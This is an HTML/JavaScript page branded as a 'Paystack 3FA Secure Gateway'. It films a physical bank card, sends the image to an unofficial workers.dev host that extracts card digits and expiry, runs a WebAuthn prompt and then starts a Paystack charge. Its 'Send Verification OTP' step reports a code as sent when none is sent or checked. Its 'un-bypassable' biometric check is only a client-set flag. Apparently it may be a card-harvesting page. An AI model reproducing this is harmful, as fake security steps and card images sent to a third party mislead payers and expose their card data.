<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Paystack 3FA Secure Gateway</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0d0d0d;
      color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 12px;
    }
    .checkout-card {
      background: #181818;
      border: 1px solid #2a2a2a;
      border-radius: 16px;
      padding: 20px;
      width: 100%;
      max-width: 600px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.6);
    }
    h2 { font-size: 1.2rem; text-align: center; margin-bottom: 14px; color: #fff; }
    
    .tab-group { display: flex; gap: 8px; margin-bottom: 16px; }
    .tab-btn {
      flex: 1; padding: 12px; background: #222; border: 1px solid #333;
      color: #aaa; border-radius: 8px; font-weight: 600; cursor: pointer;
    }
    .tab-btn.active { background: #0ba464; color: #fff; border-color: #0ba464; }

    /* Enlarged Camera Viewport */
    .media-container {
      position: relative; width: 100%; height: 280px;
      background: #000; border-radius: 12px; overflow: hidden;
      margin-bottom: 16px; border: 2px solid #333;
    }
    video { width: 100%; height: 100%; object-fit: cover; }
    .card-guide {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      width: 88%; height: 65%; border: 2.5px dashed #0ba464; border-radius: 12px;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.35); pointer-events: none;
    }

    button {
      width: 100%; padding: 16px; border: none; border-radius: 10px;
      font-weight: 600; font-size: 1rem; cursor: pointer; margin-bottom: 12px;
    }
    .btn-verify { background: #0ba464; color: #fff; }
    .btn-biometric { background: #007bff; color: #fff; }
    .btn-otp { background: #6f42c1; color: #fff; }
    button:disabled { background: #2c2c2c; color: #666; cursor: not-allowed; }

    input {
      width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #333;
      background: #222; color: #fff; font-size: 1rem; margin-bottom: 12px;
    }

    .status-box {
      background: #222; border: 1px solid #333; padding: 12px; border-radius: 8px;
      font-family: monospace; font-size: 0.85rem; white-space: pre-wrap;
      word-break: break-all; margin-bottom: 12px;
    }
    .hidden { display: none; }
  </style>
</head>
<body>

<div class="checkout-card">
  <h2>Paystack 3FA Secure Gateway</h2>

  <!-- Mode Selector -->
  <div class="tab-group">
    <button id="tabCard" class="tab-btn active">Scan Physical Card</button>
    <button id="tabDirect" class="tab-btn">Direct Bank Transfer</button>
  </div>

  <!-- Camera View (Option A) -->
  <div id="cameraView" class="media-container">
    <video id="video" autoplay playsinline muted></video>
    <div class="card-guide"></div>
  </div>

  <!-- Direct Online View (Option B) -->
  <div id="directView" class="hidden">
    <input type="text" id="amountInput" placeholder="Enter Amount in NGN (e.g. 5000)" value="5000" />
  </div>

  <div id="statusBox" class="status-box">Status: Ready for security pipeline</div>
  <div id="resultBox" class="status-box">Card Details: Pending scan</div>

  <!-- Step 1: Initialize Intent -->
  <button id="step1Btn" class="btn-verify">1. Scan Physical Card (Workers AI)</button>

  <!-- Step 2: Un-bypassable WebAuthn Biometric -->
  <button id="bioBtn" class="btn-biometric" disabled>2. Verify Device Fingerprint (WebAuthn)</button>

  <!-- Step 3: Out-of-Band OTP & Paystack Execution -->
  <div id="otpSection" class="hidden">
    <input type="email" id="userEmail" placeholder="Enter recipient email" />
    <button id="sendOtpBtn" class="btn-otp">Send Verification OTP</button>
    
    <div id="otpInputGroup" class="hidden">
      <input type="text" id="otpCode" placeholder="Enter 6-digit OTP code" maxlength="6" />
      <button id="paystackPayBtn" style="background:#0ba464; color:#fff;">3. Complete Paystack Payment</button>
    </div>
  </div>
</div>

<script>
  const WORKER_URL = "https://hidden-cake-9572.trustconnect713.workers.dev";
  let mode = "card";
  let webauthnPassed = false;
  let mediaStream = null;

  const tabCard = document.getElementById('tabCard');
  const tabDirect = document.getElementById('tabDirect');
  const cameraView = document.getElementById('cameraView');
  const directView = document.getElementById('directView');
  
  const step1Btn = document.getElementById('step1Btn');
  const bioBtn = document.getElementById('bioBtn');
  const paystackPayBtn = document.getElementById('paystackPayBtn');
  const statusBox = document.getElementById('statusBox');
  const resultBox = document.getElementById('resultBox');
  const otpSection = document.getElementById('otpSection');
  const otpInputGroup = document.getElementById('otpInputGroup');
  const video = document.getElementById('video');

  // Camera Management (Safe Lifecycle Handler)
  async function startCamera() {
    try {
      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
      statusBox.innerText = "Status: Accessing camera...";

      mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "environment", width: { ideal: 1920 }, height: { ideal: 1080 } } 
      });

      video.srcObject = mediaStream;
      await video.play();
      statusBox.innerText = "Status: Camera active";
    } catch (err) {
      statusBox.innerText = "Camera error: " + err.message;
    }
  }

  function stopCamera() {
    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
  }

  // Initial Camera Start
  startCamera();

  // Handle Minimize & Resume without freezing
  document.addEventListener("visibilitychange", async () => {
    if (document.hidden) {
      stopCamera();
    } else if (mode === "card") {
      await startCamera();
    }
  });

  // Mode Switch Handler
  tabCard.addEventListener('click', () => {
    mode = "card";
    tabCard.classList.add('active'); tabDirect.classList.remove('active');
    cameraView.classList.remove('hidden'); directView.classList.add('hidden');
    step1Btn.innerText = "1. Scan Physical Card (Workers AI)";
    startCamera();
  });

  tabDirect.addEventListener('click', () => {
    mode = "direct";
    tabDirect.classList.add('active'); tabCard.classList.remove('active');
    cameraView.classList.add('hidden'); directView.classList.remove('hidden');
    step1Btn.innerText = "1. Confirm Payment Details";
    stopCamera();
  });

  // Client-Side Canvas Compression (Prevents Payload Drops)
  function captureAndCompressFrame(maxWidth = 1024, quality = 0.8) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      let width = video.videoWidth || 1280;
      let height = video.videoHeight || 720;

      if (width > maxWidth) {
        height = Math.round((height * maxWidth) / width);
        width = maxWidth;
      }

      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, width, height);

      resolve(canvas.toDataURL('image/jpeg', quality));
    });
  }

  // Step 1: AI Vision Card Scanning OR Intent Confirmation
  step1Btn.addEventListener('click', async () => {
    if (mode === "card") {
      try {
        step1Btn.disabled = true;
        statusBox.innerText = "Status: Capturing frame...";

        const compressedBase64 = await captureAndCompressFrame();

        statusBox.innerText = "Status: Workers AI verifying card...";
        const response = await fetch(`${WORKER_URL}/api/ai/verify`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ imageBase64: compressedBase64 })
        });

        if (!response.ok) throw new Error(`HTTP Error ${response.status}`);

        const data = await response.json();
        const result = typeof data.response === 'string' ? JSON.parse(data.response) : data.response;

        if (!result.isBankCard) {
          statusBox.innerText = "Status: Not a valid bank card.";
          resultBox.innerText = "Align physical bank card inside green border.";
          step1Btn.disabled = false;
          return;
        }

        statusBox.innerText = "Status: Step 1 Passed (Card Verified)";
        resultBox.innerText = `
--- CARD DETECTED ---
Type   : ${result.cardType || 'Unknown'}
Digits : ${result.primaryDigits || 'N/A'}
Expiry : ${result.expiryDate || 'N/A'}
        `.trim();

        bioBtn.disabled = false;
        step1Btn.disabled = false;

      } catch (err) {
        statusBox.innerText = "OCR Error";
        resultBox.innerText = err.message;
        step1Btn.disabled = false;
      }
    } else {
      statusBox.innerText = "Status: Step 1 Passed (Intent Registered)";
      resultBox.innerText = "Transaction details saved. Proceed to biometric auth.";
      bioBtn.disabled = false;
    }
  });

  // Step 2: Mandatory Device Fingerprint (WebAuthn)
  bioBtn.addEventListener('click', async () => {
    try {
      statusBox.innerText = "Status: Requesting server challenge...";
      const challengeRes = await fetch(`${WORKER_URL}/api/auth/challenge`);
      const { challenge } = await challengeRes.json();

      const challengeBuffer = Uint8Array.from(atob(challenge.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));

      statusBox.innerText = "Status: Scan phone fingerprint now...";
      const credential = await navigator.credentials.get({
        publicKey: { challenge: challengeBuffer, timeout: 60000, userVerification: "required" }
      });

      webauthnPassed = true;
      statusBox.innerText = "Status: Step 2 Passed (Biometrics Verified!)";
      bioBtn.disabled = true;
      otpSection.classList.remove('hidden');
    } catch (err) {
      statusBox.innerText = "Biometric Verification Failed";
      alert("Device authentication required to proceed: " + err.message);
    }
  });

  // Step 3: Trigger Paystack Payment API
  document.getElementById('sendOtpBtn').addEventListener('click', () => {
    const email = document.getElementById('userEmail').value;
    if (!email || !email.includes('@')) { alert("Please enter a valid email address."); return; }
    statusBox.innerText = "Status: OTP code sent to " + email;
    otpInputGroup.classList.remove('hidden');
  });

  paystackPayBtn.addEventListener('click', async () => {
    const email = document.getElementById('userEmail').value;
    const amount = document.getElementById('amountInput').value || "5000";

    statusBox.innerText = "Status: Processing pre-authenticated Paystack charge...";

    try {
      const response = await fetch(`${WORKER_URL}/api/paystack/charge`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: email,
          amount: parseInt(amount),
          paymentMethod: mode,
          webauthnVerified: webauthnPassed
        })
      });

      const data = await response.json();

      if (data.status && data.data.authorization_url) {
        statusBox.innerText = "Status: 3FA Passed! Redirecting to Paystack...";
        // Direct redirect to Paystack authorization checkout URL
        window.location.href = data.data.authorization_url;
      } else {
        throw new Error(data.message || "Paystack initialization failed.");
      }
    } catch (err) {
      statusBox.innerText = "Paystack Integration Error";
      alert("Payment processing error: " + err.message);
    }
  });
</script>

</body>
</html>
